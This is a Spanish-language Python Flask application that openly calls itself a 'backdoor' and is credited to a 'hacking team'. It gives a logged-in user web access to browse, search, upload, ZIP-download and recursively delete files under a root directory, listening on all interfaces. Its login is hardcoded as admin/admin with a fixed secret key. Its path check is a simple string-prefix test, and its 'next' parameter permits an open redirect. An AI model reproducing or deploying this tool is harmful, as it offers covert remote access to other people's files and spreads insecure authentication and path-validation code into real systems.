import os
import shutil
import functools
import argparse
import zipfile # Para ZIP
import tempfile # Para archivos temporales
# io no es estrictamente necesario aquí con NamedTemporaryFile
from flask import (
    Flask, render_template_string, request, redirect,
    url_for, send_from_directory, session, flash,
    send_file, after_this_request # send_file y after_this_request
)
from werkzeug.utils import secure_filename
from datetime import datetime
import logging # Para mejor logging de errores

app = Flask(__name__)
# Configurar logging básico
logging.basicConfig(level=logging.INFO) # Puedes cambiar a logging.DEBUG para más detalle

# --- Configuración ---
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/' # ¡CAMBIAR EN PRODUCCIÓN!
app.static_folder = 'static'
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'admin'
# app.config['UPLOAD_FOLDER'] se define en if __name__ == '__main__'

# --- Conjuntos de Extensiones ---
VIEWABLE_EXTENSIONS = {'.txt', '.py', '.js', '.css', '.html', '.htm', '.xml', '.json', '.log', '.md', '.sh', '.bat', '.ini', '.cfg', '.yaml', '.yml', '.csv', '.svg', '.pdf'}
IMAGE_EXTENSIONS = {'.png', '.jpg', '.jpeg', '.gif', '.webp', '.bmp', '.ico', '.avif'}
MS_OFFICE_EXTENSIONS = {'.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp'}


# --- Plantillas HTML ---

# PLANTILLA DE LOGIN:
LOGIN_TEMPLATE = """
<!doctype html>
<html>
<head>
    <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso - BACKDOOOOR</title>
    <link rel="icon" href="{{ url_for('static', filename='favicon.png') }}" type="image/png">
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #000000; color: #00FF00; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 90%; padding: 40px; border: 2px solid #00FF00; background-color: #0a0a0a; box-shadow: 0 0 15px #00FF00; text-align: center; box-sizing: border-box; }
        .logo-img { max-width: 150px; width: 50%; height: auto; display: block; margin: 0 auto 30px auto; filter: drop-shadow(0 0 5px #ffffff); }
        label { display: block; margin-bottom: 8px; text-align: left; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #00FF00; background-color: #111111; color: #00FF00; font-family: inherit; font-size: 1.1em; box-sizing: border-box; }
        input[type="submit"] { background-color: #005500; color: #FFFFFF; padding: 12px 25px; border: 1px solid #00FF00; cursor: pointer; font-family: inherit; font-size: 1.2em; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; width: 100%; box-sizing: border-box; }
        input[type="submit"]:hover { background-color: #00FF00; color: #000000; box-shadow: 0 0 10px #00FF00; }
        .flash-error { color: #FF0000; background-color: #330000; border: 1px solid #FF0000; padding: 10px; margin: 15px 0; text-align: center; word-wrap: break-word; }
        .flash-success { color: #00FF00; background-color: #003300; border: 1px solid #00FF00; padding: 10px; margin: 15px 0; text-align: center; word-wrap: break-word; }
        h1 { color: #FF0000; margin-bottom: 15px; font-size: 2em;}
        @media (max-width: 480px) { .container { padding: 20px; width: 95%; } .logo-img { max-width: 120px; } input[type="text"], input[type="password"], input[type="submit"] { font-size: 1em; } input[type="submit"] { padding: 10px 20px; } h1 { font-size: 1.5em; } }
    </style>
</head>
<body> <div class="container"> <img src="{{ url_for('static', filename='hacked.png') }}" alt="ACCESS DENIED?" class="logo-img"> <h1>-BACKD0000R-</h1> {% with messages = get_flashed_messages(with_categories=true) %} {% if messages %} {% for category, message in messages %} <div class="flash-{{ category }}">{{ message }}</div> {% endfor %} {% endif %} {% endwith %} <form method="post"> <label for="username">Usuario:</label> <input type="text" id="username" name="username" required> <label for="password">Contraseña:</label> <input type="password" id="password" name="password" required> <input type="submit" value="Acceder"> </form> </div> </body>
</html>
"""

# PLANTILLA DEL EXPLORADOR: Con JS Alternativo
BROWSE_TEMPLATE = """
<!doctype html>
<html>
<head>
    <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Explorador BACKDOOOOR</title>
    <link rel="icon" href="{{ url_for('static', filename='favicon.png') }}" type="image/png">
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #000000; background-image: url("{{ url_for('static', filename='ouroboros.png') }}"); background-size: cover; background-position: center; background-repeat: no-repeat; background-attachment: fixed; color: #00FF00; margin: 0; padding: 10px; box-sizing: border-box; }
        .main-content { background-color: rgba(0, 0, 0, 0.65); padding: 15px; border: 1px solid #005500; box-shadow: 0 0 10px #003300; box-sizing: border-box; margin-bottom: 15px; }
        h1, h2 { color: #33FF33; border-bottom: 1px solid #005500; padding-bottom: 5px; margin-top: 0; font-size: 1.5em; } h2 { font-size: 1.3em; }
        ul { list-style: none; padding: 0; }
        li { margin-bottom: 8px; padding: 8px 5px 8px 10px; border-left: 3px solid #005500; background-color: rgba(0, 20, 0, 0.65); transition: background-color 0.2s ease; border: 1px solid rgba(0, 85, 0, 0.4); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
        li:hover { background-color: rgba(0, 50, 0, 0.8); }
        .item-checkbox { margin-right: 10px; flex-shrink: 0; transform: scale(1.2); cursor: pointer;}
        .item-details { flex-grow: 1; margin-right: 10px; word-wrap: break-word; overflow: hidden; display: flex; align-items: center; }
        .item-icon { margin-right: 8px; font-size: 1.1em; }
        .item-texts { display: flex; flex-direction: column; }
        .item-details a { display: inline-block; margin-bottom: 0px; }
        a { text-decoration: none; color: #55FF55; } a:hover { text-decoration: underline; color: #FFFFFF; }
        .nav-links { margin-bottom: 15px; padding: 8px; border-bottom: 1px dashed #005500; background-color: rgba(0, 0, 0, 0.6); text-align: center; } .nav-links a { margin: 0 10px; padding: 5px; color: #88FF88; display: inline-block; } .nav-links a:hover { background-color: #003300; color: #FFFFFF; }
        .item-actions { flex-shrink: 0; } .delete-button { background: none; border: none; color: #FF6666; text-decoration: none; cursor: pointer; padding: 0 5px; font-family: inherit; font-size: 0.9em; vertical-align: middle; } .delete-button:hover { text-decoration: underline; color: #FF9999; }
        hr { border: 0; border-top: 1px dashed #005500; margin: 15px 0; }
        .flash-error { color: #FF0000; background-color: #330000; border: 1px solid #FF0000; padding: 10px; margin: 15px 0; word-wrap: break-word; } .flash-success { color: #00FF00; background-color: #003300; border: 1px solid #00FF00; padding: 10px; margin: 15px 0; word-wrap: break-word; }
        .info { font-size: 0.8em; color: #CCCCCC; display: block; margin-top: 0px; } .path-info { font-size: 0.75em; color: #88AA88; display: block; margin-top: 2px; word-break: break-all;}
        .search-form { margin-bottom: 15px; background-color: rgba(0, 10, 0, 0.5); padding: 10px; border: 1px solid #003300; display: flex; flex-wrap: wrap; align-items: center;} .search-form label { margin-right: 10px; font-size: 1.1em; flex-shrink: 0;} .search-form input[type="search"] { flex-grow: 1; padding: 8px; margin-right: 10px; border: 1px solid #00FF00; background-color: #111111; color: #00FF00; font-family: inherit; font-size: 1em; min-width: 150px; } .search-form button[type="submit"] { background-color: #005500; color: #FFFFFF; padding: 8px 15px; border: 1px solid #00FF00; cursor: pointer; font-family: inherit; font-size: 1em; transition: all 0.2s ease; flex-shrink: 0; } .search-form button[type="submit"]:hover { background-color: #00FF00; color: #000000; } .clear-search-link { margin-left: 15px; color: #FF8888; font-size: 0.9em;}
        .upload-form-container { background-color: rgba(0, 20, 0, 0.6); padding: 20px; margin-top: 20px; border: 1px solid #004400; border-left: 5px solid #00FF00; box-shadow: inset 0 0 8px rgba(0, 50, 0, 0.5); } .upload-form-container h2 { margin-top: 0; margin-bottom: 15px; } .upload-form-container input[type="file"] { background-color: #050505; border: 1px dashed #00FF00; color: #88FF88; padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 15px; cursor: pointer; transition: background-color 0.2s ease, border-color 0.2s ease; } .upload-form-container input[type="file"]:hover { background-color: #111; border-color: #55FF55; }
        .upload-form-container button[type="submit"] { background-color: #008800; color: #FFFFFF; border: none; padding: 10px 20px; font-family: inherit; margin-left: 0; transition: all 0.2s ease; width: 100%; box-sizing: border-box; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.4); }
        .upload-form-container button[type="submit"]:hover:not(:disabled) { background-color: #33FF33; color: #000000; box-shadow: 0 0 10px #33FF33; }
        .upload-form-container button[type="submit"]:disabled { background-color: #555; color: #999; cursor: not-allowed; box-shadow: none; }
        .download-selected-btn { background-color: #005588; color: #FFFFFF; padding: 10px 20px; border: 1px solid #3399DD; cursor: pointer; font-family: inherit; font-size: 1.1em; transition: all 0.2s ease; margin-top: 15px; width: 100%; box-sizing: border-box; text-transform: uppercase; letter-spacing: 1px; }
        .download-selected-btn:hover { background-color: #0077CC; color: #FFFFFF; box-shadow: 0 0 8px #0077CC; }
        @media (max-width: 768px) { h1 { font-size: 1.3em; } h2 { font-size: 1.1em; } .main-content { padding: 10px; } li { padding: 6px 8px; } .info { font-size: 0.75em;} .delete-button { font-size: 0.8em; } .search-form input[type="search"] { font-size: 0.9em; padding: 6px; } .search-form button[type="submit"] { font-size: 0.9em; padding: 6px 10px;} .upload-form-container { padding: 15px; } .download-selected-btn { font-size: 1em; padding: 10px 15px; }}
        @media (max-width: 480px) { body { padding: 5px; } .main-content { padding: 8px; border: none; } .nav-links a { display: block; margin: 5px auto; padding: 8px; border: 1px solid #005500; background-color: rgba(0, 30, 0, 0.7); } li { padding: 10px; flex-direction: row; align-items: center; } .item-details { margin-right: 5px; margin-bottom: 0; } .item-details a { display: inline-block; } .info { margin-left: 10px; display: inline; } .item-actions { width: auto; text-align: right; margin-top: 0; } .delete-button { padding: 3px 5px; font-size: 0.8em; display: inline-block; background: none; border: none; } input[type="file"] { font-size: 0.9em; } input[type="submit"] { padding: 12px; font-size: 1em; } h1, h2 { padding-bottom: 3px; margin-bottom: 10px; } hr { margin: 10px 0; } .search-form { flex-direction: column; align-items: stretch; } .search-form label { margin-bottom: 5px; } .search-form input[type="search"] { margin-right: 0; margin-bottom: 10px; } .search-form button[type="submit"] { margin-top: 5px; } .clear-search-link { margin-left: 0; margin-top: 10px; display: inline-block; } .upload-form-container { border-left-width: 3px; padding: 10px;} .upload-form-container input[type="submit"] { font-size: 1em; padding: 10px;} .download-selected-btn { font-size: 1em; padding: 10px;} }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="nav-links"> <a href="{{ url_for('browse', path=current_dir if not is_search else '') }}">{% if is_search %}Volver Directorio{% else %}Refrescar{% endif %}</a> {% if not is_search %} | <a href="{{ parent_link }}">Subir Nivel</a>{% endif %} | <a href="{{ url_for('logout') }}">Cerrar Sesión</a> </div>
        <div class="search-form"> <form method="get" action="{{ url_for('browse') }}"> <label for="q">Buscar:</label> <input type="search" id="q" name="q" value="{{ q or '' }}" placeholder="Nombre o parte..."> <button type="submit">Buscar</button> {% if is_search %} <a href="{{ url_for('browse') }}" class="clear-search-link">[Limpiar]</a> {% endif %} </form> </div>
        {% if is_search %} <h1>Resultados para: "{{ q }}"</h1> {% else %} <h1>Directorio: {{ current_dir or '/' }}</h1> {% endif %}
        {% with messages = get_flashed_messages(with_categories=true) %} {% if messages %} {% for category, message in messages %} <div class="flash-{{ category }}">{{ message }}</div> {% endfor %} {% endif %} {% endwith %} <hr>
        <form id="file-list-form" method="post" action="{{ url_for('download_selected') }}">
            {% if is_search %} <h2>Archivos Encontrados:</h2> <ul> {% for result in search_results %} <li> <div class="item-details"> <span class="item-icon">📄</span> <div class="item-texts"> <a href="{{ result.link }}" target="_blank" rel="noopener noreferrer">{{ result.name }}</a> <span class="path-info">./{{ result.full_relative_path }}</span> <span class="info">({{ result.size }} bytes, Mod: {{ result.modified }})</span> </div> </div> <div class="item-actions"> <form action="{{ result.delete_link }}" method="post" style="display: inline; vertical-align: middle;"> <button type="submit" class="delete-button" onclick="return confirm('¿SEGURO {{ result.name }}?');">[Eliminar]</button> </form> </div> </li> {% else %} <li><em>No se encontraron archivos para "{{ q }}".</em></li> {% endfor %} </ul>
            {% else %} <h2>Contenido:</h2> <ul> {% for item in items %} <li> {% if item.name != '.' and item.name != '..' %} <input type="checkbox" name="selected_items" value="{{ item.relative_path }}" class="item-checkbox" id="cb_{{ loop.index }}"> {% else %} <span style="width: 25px; display: inline-block;"></span> {% endif %} <div class="item-details"> <span class="item-icon">{% if item.type == 'dir' %}📁{% else %}📄{% endif %}</span> <div class="item-texts"> <a href="{{ item.link }}" {% if item.is_viewable_inline %}target="_blank" rel="noopener noreferrer"{% endif %}> {% if item.type == 'dir' %}<strong>{{ item.name }}</strong>{% else %}{{ item.name }}{% endif %} </a> <span class="info">{% if item.type == 'file' %}({{ item.size }} bytes, Mod: {{ item.modified }}){% endif %}</span> </div> </div> {% if item.name != '.' and item.name != '..' %} <div class="item-actions"> <form action="{{ item.delete_link }}" method="post" style="display: inline; vertical-align: middle;"> <button type="submit" class="delete-button" onclick="return confirm('¿SEGURO {{ item.name }}{% if item.type == 'dir' %} y contenido{% endif %}?');">[Eliminar]</button> </form> </div> {% endif %} </li> {% else %} <li><em>Directorio vacío</em></li> {% endfor %} </ul>
                 {% if items %} <button type="submit" id="download-selected-btn" class="download-selected-btn">Descargar Selección (.zip)</button> {% endif %} <hr>
                 <div class="upload-form-container"> <h2>Subir Archivo a este Directorio:</h2> <form id="upload-form" class="upload-form" action="{{ url_for('upload_file') }}" method="post" enctype="multipart/form-data"> <input type="file" name="file" required title="Seleccionar archivo para subir" id="file-input"> <input type="hidden" name="current_path" value="{{ current_dir }}"> <button type="submit" id="upload-submit-btn" disabled>Subir Archivo</button> </form> </div>
            {% endif %}
        </form> <hr> <p style="font-size: 0.8em; color: #555; text-align: center;">!!UROBOROS HACKING TEAM!!</p>
    </div>
    {# --- JavaScript Alternativo para Botones --- #}
    {% if not is_search %}
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // --- Lógica para Botón Descargar Selección (Validación al Enviar) ---
            const fileListForm = document.getElementById('file-list-form');
            if (fileListForm) {
                fileListForm.addEventListener('submit', function(event) {
                    // Solo validar si el botón de descarga fue el que inició el submit
                    // Usamos event.submitter que es más moderno y fiable que activeElement
                    const submitter = event.submitter;
                    if (!submitter || submitter.id !== 'download-selected-btn') {
                        // Si no hay submitter o no es el botón de descarga, permitir (ej: submit por Enter en un futuro campo)
                        // console.log("Submit no originado por botón de descarga, permitiendo...");
                        return;
                    }

                    const checkedCheckboxes = fileListForm.querySelectorAll('.item-checkbox:checked');
                    const checkedCount = checkedCheckboxes.length;
                    console.log(`Submit para descarga. Checkboxes marcados: ${checkedCount}`);
                    if (checkedCount === 0) {
                        alert("Por favor, selecciona al menos un archivo o carpeta para descargar.");
                        event.preventDefault(); // ¡IMPORTANTE! Detener el envío del formulario
                        console.log("Envío de formulario DETENIDO.");
                    } else {
                        console.log("Envío de formulario PERMITIDO.");
                        // Permitir que el formulario se envíe
                    }
                });
            } else { console.error("Error: Formulario 'file-list-form' no encontrado."); }

            // --- Lógica para Botón Subir Archivo (Habilitar/Deshabilitar) ---
            const fileInput = document.getElementById('file-input');
            const uploadBtn = document.getElementById('upload-submit-btn');
            if (fileInput && uploadBtn) {
                fileInput.addEventListener('change', function() {
                    const filesSelected = fileInput.files && fileInput.files.length > 0;
                    console.log(`Input archivo cambiado. Archivos: ${fileInput.files.length}`);
                    uploadBtn.disabled = !filesSelected;
                    console.log(`Botón Subir ${uploadBtn.disabled ? 'DESHABILITADO' : 'HABILITADO'}`);
                });
                uploadBtn.disabled = true; // Estado inicial
                console.log("Establecido estado inicial botón subida (deshabilitado).")
            } else { console.warn("Input archivo o botón subida no encontrado."); }
        });
    </script>
    {% endif %}
</body>
</html>
"""


# --- Decorador de Autenticación ---
# CORREGIDO: Asegurar indentación correcta
def login_required(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            flash('>> Acceso denegado. <<', 'error')
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

# --- Funciones de Utilidad ---
def get_file_metadata(filepath):
    try:
        stat = os.stat(filepath)
        size = stat.st_size
        modified_dt = datetime.fromtimestamp(stat.st_mtime)
        modified_str = modified_dt.strftime('%d/%m/%y %H:%M')
        return size, modified_str
    except OSError:
        return 'N/A', 'N/A'

# --- Rutas ---

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(app.static_folder, 'favicon.png', mimetype='image/png')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            flash('>> Autenticación exitosa. <<', 'success')
            next_url = request.args.get('next')
            return redirect(next_url or url_for('browse'))
        else:
            flash('>> Credenciales inválidas. <<', 'error')
            return render_template_string(LOGIN_TEMPLATE)
    if 'logged_in' in session:
        return redirect(url_for('browse'))
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    flash('>> Sesión finalizada. <<', 'success')
    return redirect(url_for('login'))

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
@login_required
def browse(path=''):
    search_query = request.args.get('q', '').strip()
    base_dir = os.path.abspath(app.config['UPLOAD_FOLDER']).replace('\\', '/')

    if search_query:
        search_results = []
        try:
            for dirpath, dirnames, filenames in os.walk(base_dir):
                # Excluir ciertos directorios si es necesario
                # dirnames[:] = [d for d in dirnames if d not in ['.git', '__pycache__']]
                for filename in filenames:
                    if search_query.lower() in filename.lower():
                        abs_filepath = os.path.join(dirpath, filename)
                        full_relative_path = os.path.relpath(abs_filepath, base_dir).replace('\\', '/')
                        size, modified = get_file_metadata(abs_filepath)
                        file_link = url_for('browse', path=full_relative_path)
                        delete_link = url_for('delete_item', path=full_relative_path)
                        search_results.append({
                            'name': filename,
                            'full_relative_path': full_relative_path,
                            'link': file_link,
                            'delete_link': delete_link,
                            'size': size,
                            'modified': modified
                        })
        except Exception as e:
            flash(f"Error búsqueda: {e}", "error")
            search_results = []
        return render_template_string(BROWSE_TEMPLATE, is_search=True, q=search_query, search_results=search_results, current_dir='', parent_link=url_for('browse'))
    else:
        path = path.replace('\\', '/').strip('/')
        abs_path = os.path.normpath(os.path.join(base_dir, path)).replace('\\', '/')
        if not abs_path.startswith(base_dir) or not os.path.exists(abs_path):
            flash(f"Error: Acceso/ruta inválida: '{path}'", "error")
            return redirect(url_for('browse'))

        if os.path.isdir(abs_path):
            items = []
            try:
                with os.scandir(abs_path) as entries:
                    for entry in entries:
                        item_type = 'dir' if entry.is_dir() else 'file'
                        _root, ext = os.path.splitext(entry.name); file_ext = ext.lower()
                        is_viewable = item_type == 'file' and (file_ext in VIEWABLE_EXTENSIONS or file_ext in IMAGE_EXTENSIONS)
                        relative_path = os.path.join(path, entry.name).replace('\\', '/') # Ruta relativa desde base_dir
                        item_link = url_for('browse', path=relative_path)
                        delete_link = url_for('delete_item', path=relative_path)
                        size, modified = ('N/A', 'N/A')
                        if item_type == 'file':
                            size, modified = get_file_metadata(entry.path)
                        items.append({
                            'name': entry.name,
                            'type': item_type,
                            'link': item_link,
                            'delete_link': delete_link,
                            'size': size,
                            'modified': modified,
                            'is_viewable_inline': is_viewable,
                            'relative_path': relative_path # Necesario para el valor del checkbox
                        })
                items.sort(key=lambda x: (x['type'] != 'dir', x['name'].lower()))
            except OSError as e:
                flash(f"Error al listar '{path}': {e}", "error")
                parent_dir = os.path.dirname(path).replace('\\', '/')
                return redirect(url_for('browse', path=parent_dir if path else ''))
            parent_dir = os.path.dirname(path).replace('\\', '/') if path else ''
            parent_link = url_for('browse', path=parent_dir)
            return render_template_string(BROWSE_TEMPLATE, is_search=False, q=None, items=items, current_dir=path, parent_link=parent_link)

        elif os.path.isfile(abs_path):
            try:
                _root, ext = os.path.splitext(path); file_ext = ext.lower()
                if file_ext in VIEWABLE_EXTENSIONS or file_ext in IMAGE_EXTENSIONS:
                    return send_from_directory(base_dir, path, as_attachment=False)
                elif file_ext in MS_OFFICE_EXTENSIONS:
                    return send_from_directory(base_dir, path, as_attachment=True)
                else:
                    return send_from_directory(base_dir, path, as_attachment=True)
            except FileNotFoundError:
                flash(f"Archivo no encontrado: '{path}'", "error")
            except Exception as e:
                flash(f"Error al servir archivo '{path}': {e}", "error")
            parent_dir = os.path.dirname(path).replace('\\', '/')
            return redirect(url_for('browse', path=parent_dir))
        else:
            flash(f"Ruta no válida: '{path}'", "error")
            return redirect(url_for('browse'))

@app.route('/download_selected', methods=['POST'])
@login_required
def download_selected():
    selected_relative_paths = request.form.getlist('selected_items')
    base_dir = os.path.abspath(app.config['UPLOAD_FOLDER']).replace('\\', '/')
    referrer = request.referrer or url_for('browse')

    if not selected_relative_paths:
        flash("No se seleccionó ningún elemento para descargar.", "error")
        return redirect(referrer)

    app.logger.info(f"Solicitud de descarga para: {selected_relative_paths}")
    validated_abs_paths = []
    validated_relative_paths = []

    for rel_path in selected_relative_paths:
        # No necesitamos secure_filename aquí si validamos bien con os.path.normpath y startswith
        abs_path = os.path.normpath(os.path.join(base_dir, rel_path)).replace('\\', '/')
        if not abs_path.startswith(base_dir) or not os.path.exists(abs_path):
            flash(f"Error: Elemento no válido o no encontrado: {rel_path}", "error")
            app.logger.error(f"Validación fallida: abs='{abs_path}', base='{base_dir}'")
            return redirect(referrer)
        validated_abs_paths.append(abs_path)
        validated_relative_paths.append(rel_path)

    app.logger.info(f"Rutas validadas (abs): {validated_abs_paths}")

    if len(validated_abs_paths) == 1 and os.path.isfile(validated_abs_paths[0]):
        app.logger.info(f"Redirigiendo a descarga única: {validated_relative_paths[0]}")
        return redirect(url_for('browse', path=validated_relative_paths[0]))

    temp_zip_file = None
    zipf = None
    temp_zip_path = None
    try:
        temp_zip_file = tempfile.NamedTemporaryFile(suffix='.zip', delete=False)
        temp_zip_path = temp_zip_file.name
        app.logger.info(f"Creando ZIP temporal en: {temp_zip_path}")
        # Usar 'with' asegura que se cierre incluso si hay error dentro del bloque
        with zipfile.ZipFile(temp_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for abs_p, rel_p in zip(validated_abs_paths, validated_relative_paths):
                if os.path.isfile(abs_p):
                    zipf.write(abs_p, arcname=rel_p)
                    app.logger.info(f"  Añadido archivo: {rel_p}")
                elif os.path.isdir(abs_p):
                    app.logger.info(f"  Añadiendo dir: {rel_p}")
                    for dirpath, dirnames, filenames in os.walk(abs_p):
                        for filename in filenames:
                            file_abs_path = os.path.join(dirpath, filename)
                            # arcname debe ser relativo a base_dir para mantener estructura
                            arc_path = os.path.relpath(file_abs_path, base_dir).replace('\\', '/')
                            zipf.write(file_abs_path, arcname=arc_path)
                            app.logger.debug(f"    Añadido sub-item: {arc_path}")
        # zipf se cierra automáticamente al salir del 'with'
        app.logger.info(f"ZIP creado exitosamente.")
        download_name = f"seleccion_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"

        @after_this_request
        def remove_file(response):
            try:
                if temp_zip_path and os.path.exists(temp_zip_path):
                    os.remove(temp_zip_path)
                    app.logger.info(f"ZIP temporal eliminado: {temp_zip_path}")
            except Exception as error:
                app.logger.error(f"Error eliminando ZIP temporal {temp_zip_path}: {error}")
            return response

        app.logger.info(f"Enviando archivo ZIP: {download_name}")
        # Necesitamos pasar el path del archivo temporal a send_file
        return send_file(temp_zip_path, as_attachment=True, download_name=download_name)

    except Exception as e:
        app.logger.exception(f"Error EXCEPCIÓN al crear/procesar el archivo ZIP")
        flash(f"Error fatal al crear el archivo ZIP: {e}", "error")
        # Limpiar si se creó el archivo temporal pero hubo error antes de @after_this_request
        if temp_zip_path and os.path.exists(temp_zip_path):
             try:
                 os.remove(temp_zip_path)
                 app.logger.warning(f"ZIP temporal eliminado por error: {temp_zip_path}")
             except Exception as del_error:
                  app.logger.error(f"Error eliminando ZIP temporal por error {temp_zip_path}: {del_error}")
        return redirect(referrer)
    # No necesitamos finally si usamos 'with' para el ZipFile y registramos @after_this_request antes de retornar

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    current_path = request.form.get('current_path', '').replace('\\', '/').strip('/')
    redirect_url = url_for('browse', path=current_path)
    if 'file' not in request.files: flash('No se encontró archivo.', 'error'); return redirect(redirect_url)
    file = request.files['file']
    if file.filename == '': flash('No se seleccionó archivo.', 'error'); return redirect(redirect_url)
    if file:
        filename = secure_filename(file.filename)
        if not filename: flash('Nombre de archivo inválido.', 'error'); return redirect(redirect_url)
        base_dir = os.path.abspath(app.config['UPLOAD_FOLDER']).replace('\\', '/')
        target_dir_abs = os.path.normpath(os.path.join(base_dir, current_path)).replace('\\', '/')
        if not target_dir_abs.startswith(base_dir): flash('Subida no permitida.', 'error'); return redirect(url_for('browse'))
        abs_filepath = os.path.join(target_dir_abs, filename)
        if os.path.exists(abs_filepath): flash(f'Error: Archivo "{filename}" ya existe.', 'error'); return redirect(redirect_url)
        try:
            if not os.path.exists(target_dir_abs):
                 if target_dir_abs.startswith(base_dir): os.makedirs(target_dir_abs)
                 else: raise OSError("Creación fuera de base.")
            file.save(abs_filepath); flash(f'Archivo "{filename}" subido.', 'success')
        except OSError as e: flash(f'Error al guardar "{filename}": {e}', 'error')
        except Exception as e: flash(f'Error inesperado al subir "{filename}": {e}', 'error')
    return redirect(redirect_url)

@app.route('/delete/<path:path>', methods=['POST'])
@login_required
def delete_item(path):
    path = path.replace('\\', '/').strip('/')
    base_dir = os.path.abspath(app.config['UPLOAD_FOLDER']).replace('\\', '/')
    abs_path = os.path.normpath(os.path.join(base_dir, path)).replace('\\', '/')
    parent_dir = os.path.dirname(path).replace('\\', '/') if path else ''
    redirect_url = url_for('browse', path=parent_dir)
    if not abs_path.startswith(base_dir) or abs_path == base_dir: flash('Eliminación no permitida.', 'error'); return redirect(redirect_url)
    if not os.path.exists(abs_path): flash(f'"{os.path.basename(path)}" no existe.', 'error'); return redirect(redirect_url)
    try:
        item_name = os.path.basename(abs_path)
        if os.path.isdir(abs_path): shutil.rmtree(abs_path); flash(f'>> Directorio "{item_name}" eliminado. <<', 'success')
        else: os.remove(abs_path); flash(f'>> Archivo "{item_name}" eliminado. <<', 'success')
    except OSError as e: flash(f'Error al eliminar "{os.path.basename(path)}": {e}', 'error')
    except Exception as e: flash(f'Error inesperado al eliminar "{os.path.basename(path)}": {e}', 'error')
    return redirect(redirect_url)

# Bloque principal de ejecución
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Flask File Explorer BACKDOOOOR')
    parser.add_argument('--path', '-p', default='.', help='Ruta del directorio raíz (default: directorio actual).')
    args = parser.parse_args()
    custom_path_input = args.path; absolute_path = os.path.abspath(custom_path_input)
    if not os.path.isdir(absolute_path):
        print(f" !!! ERROR: Ruta '{custom_path_input}' ('{absolute_path}') no válida. Usando '.'")
        absolute_path = os.path.abspath('.')
        if not os.path.isdir(absolute_path):
            print(" !!! ERROR CRÍTICO: Directorio actual inválido.")
            exit(1) # Salir si ni el directorio actual es válido
    app.config['UPLOAD_FOLDER'] = absolute_path
    static_folder = os.path.join(os.path.dirname(__file__), 'static')
    if not os.path.exists(static_folder):
        try:
            os.makedirs(static_folder)
            print(f" [*] Carpeta 'static' creada.")
        except OSError as e:
            print(f" [!] ADVERTENCIA: No se pudo crear 'static': {e}")
    print(" --- INICIANDO SERVIDOR BACKDOOOOR ---")
    print(f" [*] Carpeta base: {app.config['UPLOAD_FOLDER']}")
    print(f" [*] Carpeta estática: {static_folder}")
    print(f" [*] Login: '{ADMIN_USERNAME}' / '{ADMIN_PASSWORD}'")
    print(" [*] ADVERTENCIA: Credenciales/Secret Key hardcodeadas.")
    print(" [*] ADVERTENCIA: Eliminación recursiva activada.")
    print(" ---")
    print(" [*] Servidor en http://0.0.0.0:8000")
    print(" --- Presiona CTRL+C para detener ---")
    app.run(host='0.0.0.0', port=8000, debug=False) # DEBUG=TRUE para ver errores